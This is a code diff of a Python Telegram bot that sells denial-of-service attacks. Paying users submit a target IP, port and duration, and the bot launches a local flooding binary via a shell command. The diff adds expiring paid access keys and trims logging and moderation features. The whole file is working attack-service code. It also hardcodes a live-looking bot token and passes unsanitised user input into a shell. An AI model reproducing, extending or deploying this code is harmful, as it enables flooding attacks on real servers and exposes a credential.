@@ -4,13 +4,15 @@ import datetime
 import time
 import subprocess
 import threading
+import random
+import string
 from telebot import types
 
 # TELEGRAM BOT TOKEN
 bot = telebot.TeleBot('7973805250:AAHbHYf3aYKsONcH-TDsmJljEZjpLCLSixM')
 
 # GROUP AND CHANNEL DETAILS
-GROUP_ID = "-1002369239894"
+GROUP_ID = "-1002252633433"
 CHANNEL_USERNAME = "@KHAPITAR_BALAK77"
 SCREENSHOT_CHANNEL = "@KHAPITAR_BALAK77"
 ADMINS = [7129010361]
@@ -22,6 +24,8 @@ pending_feedback = {}
 warn_count = {}
 attack_logs = []
 user_attack_count = {}
+keys = {}  # Generated keys with expiry
+user_keys = {}  # Redeemed users
 
 # FUNCTION TO CHECK IF USER IS IN CHANNEL
 def is_user_in_channel(user_id):
@@ -31,12 +35,65 @@ def is_user_in_channel(user_id):
     except:
         return False
 
+# FUNCTION TO GENERATE RANDOM KEYS
+def generate_key(length=10):
+    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))
+
+# /GENKEY COMMAND (ADMIN ONLY)
+@bot.message_handler(commands=['genkey'])
+def generate_access_key(message):
+    if message.from_user.id not in ADMINS:
+        bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")
+        return
+
+    command = message.text.split()
+    if len(command) != 2:
+        bot.reply_to(message, "⚠️ USAGE: /genkey <DAYS>")
+        return
+
+    try:
+        days = int(command[1])
+    except ValueError:
+        bot.reply_to(message, "❌ DAYS MUST BE A NUMBER!")
+        return
+
+    expiry_date = datetime.datetime.now() + datetime.timedelta(days=days)
+    new_key = generate_key()
+    keys[new_key] = expiry_date
+
+    bot.reply_to(message, f"✅ NEW KEY GENERATED:\n🔑 `{new_key}`\n📅 Expiry: {expiry_date.strftime('%Y-%m-%d')}", parse_mode="Markdown")
+
+# /REDEEM COMMAND
+@bot.message_handler(commands=['redeem'])
+def redeem_key(message):
+    command = message.text.split()
+    if len(command) != 2:
+        bot.reply_to(message, "⚠️ USAGE: /redeem <KEY>")
+        return
+
+    user_id = message.from_user.id
+    key = command[1]
+
+    if key not in keys:
+        bot.reply_to(message, "❌ INVALID KEY!")
+        return
+
+    if datetime.datetime.now() > keys[key]:
+        bot.reply_to(message, "⏳ THIS KEY HAS EXPIRED!")
+        del keys[key]
+        return
+
+    user_keys[user_id] = keys[key]
+    del keys[key]
+
+    bot.reply_to(message, f"🎉 SUCCESSFULLY REDEEMED!\n📅 Valid till: {user_keys[user_id].strftime('%Y-%m-%d')}", parse_mode="Markdown")
+
 # SCREENSHOT VERIFICATION FUNCTION
 def verify_screenshot(user_id, message):
     if user_id in pending_feedback:
         bot.forward_message(SCREENSHOT_CHANNEL, message.chat.id, message.message_id)
-        bot.send_message(SCREENSHOT_CHANNEL, f"📸 **PAID*USER `{user_id}` KA SCREENSHOT VERIFIED!** ✅")
-        bot.reply_to(message, "✅ PAID GROUP KA SCREENSHOT MIL GAYA! AB TU NAYA ATTACK LAGA SAKTA HAI. 🚀")
+        bot.send_message(SCREENSHOT_CHANNEL, f"📸 **PAID USER `{user_id}` KA SCREENSHOT VERIFIED!** ✅")
+        bot.reply_to(message, "✅ SCREENSHOT MIL GAYA! AB TU NAYA ATTACK LAGA SAKTA HAI. 🚀")
         del pending_feedback[user_id]  
     else:
         bot.reply_to(message, "❌ AB SCREENSHOT BHEJNE KI ZAROORAT NAHI HAI!")
@@ -85,18 +142,12 @@ def handle_attack(message):
 
     bot.send_message(message.chat.id, confirm_msg, parse_mode="Markdown")
 
-    # PIN ATTACK STATUS
-    bot.pin_chat_message(message.chat.id, message.message_id)
-
     is_attack_running = True
     attack_end_time = datetime.datetime.now() + datetime.timedelta(seconds=time_duration)
     pending_feedback[user_id] = True  
 
-    bot.send_message(message.chat.id, f"🚀 ATTACK SHURU!\n🎯 `{target}:{port}`\n⏳ {time_duration}S\nBETA SCREENSHOT BHEJ AB", parse_mode="Markdown")
-
-    # Attack Execution
     try:
-        subprocess.run(f"./bgmi {target} {port} {time_duration} 100", shell=True, check=True, timeout=time_duration)
+        subprocess.run(f"./Moin {target} {port} {time_duration}", shell=True, check=True, timeout=time_duration)
     except subprocess.TimeoutExpired:
         bot.reply_to(message, "❌ ATTACK TIMEOUT HO GAYA! 🚨")
     except subprocess.CalledProcessError:
@@ -106,71 +157,11 @@ def handle_attack(message):
         attack_end_time = None  
         bot.send_message(message.chat.id, "✅ ATTACK KHATAM! 🎯\n📸 AB SCREENSHOT BHEJ, WARNA AGLA ATTACK NAHI MILEGA!")
 
-        # UNPIN ATTACK STATUS
-        bot.unpin_chat_message(message.chat.id)
-
-        # ATTACK LOGS
-        attack_logs.append(f"{user_id} -> {target}:{port} ({time_duration}s)")
-        user_attack_count[user_id] = user_attack_count.get(user_id, 0) + 1
-
-# AUTO ANNOUNCEMENT SYSTEM
-def auto_announcement():
-    while True:
-        time.sleep(21600)  # 6 HOURS
-        bot.send_message(GROUP_ID, "📢 **GRP UPDATE:** RULES FOLLOW KARO, WARNA BAN PAKKA! 🚀")
-
 # HANDLE SCREENSHOT SUBMISSION
 @bot.message_handler(content_types=['photo'])
 def handle_screenshot(message):
     user_id = message.from_user.id
     verify_screenshot(user_id, message)
 
-# ADMIN RESTART COMMAND (ONLY ADMINS)
-@bot.message_handler(commands=['restart'])
-def restart_bot(message):
-    if message.from_user.id in ADMINS:
-        bot.send_message(message.chat.id, "♻️ BOT RESTART HO RAHA HAI...")
-        time.sleep(2)
-        subprocess.run("python3 m.py", shell=True)
-    else:
-        bot.reply_to(message, "🚫 SIRF ADMIN HI RESTART KAR SAKTA HAI!")
-
-# HANDLE CHECK COMMAND
-@bot.message_handler(commands=['check'])
-def check_status(message):
-    if is_attack_running:
-        remaining_time = (attack_end_time - datetime.datetime.now()).total_seconds()
-        bot.reply_to(message, f"✅ **ATTACK CHAL RAHA HAI!**\n⏳ **BACHI HUI TIME:** {int(remaining_time)}S")
-    else:
-        bot.reply_to(message, "❌ KOI ATTACK ACTIVE NAHI HAI!")
-
-# ATTACK STATS SYSTEM
-@bot.message_handler(commands=['stats'])
-def attack_stats(message):
-    stats_msg = "📊 **ATTACK STATS:**\n\n"
-    for user, count in user_attack_count.items():
-        stats_msg += f"👤 `{user}` ➝ {count} ATTACKS 🚀\n"
-    bot.send_message(message.chat.id, stats_msg, parse_mode="Markdown")
-
-# HANDLE WARN SYSTEM
-@bot.message_handler(commands=['warn'])
-def warn_user(message):
-    if message.from_user.id not in ADMINS:
-        return
-
-    if not message.reply_to_message:
-        bot.reply_to(message, "❌ KISI KO WARN KARNE KE LIYE USKE MESSAGE PE REPLY KARO!")
-        return
-
-    user_id = message.reply_to_message.from_user.id
-    warn_count[user_id] = warn_count.get(user_id, 0) + 1
-
-    if warn_count[user_id] >= 3:
-        bot.kick_chat_member(GROUP_ID, user_id)
-        bot.send_message(GROUP_ID, f"🚫 **USER {user_id} KO 3 WARN MIL CHUKE THE, ISLIYE BAN KAR DIYA GAYA!**")
-    else:
-        bot.send_message(GROUP_ID, f"⚠️ **USER {user_id} KO WARNING {warn_count[user_id]}/3 DI GAYI HAI!**")
-
 # START POLLING
-threading.Thread(target=auto_announcement).start()
 bot.polling(none_stop=True)
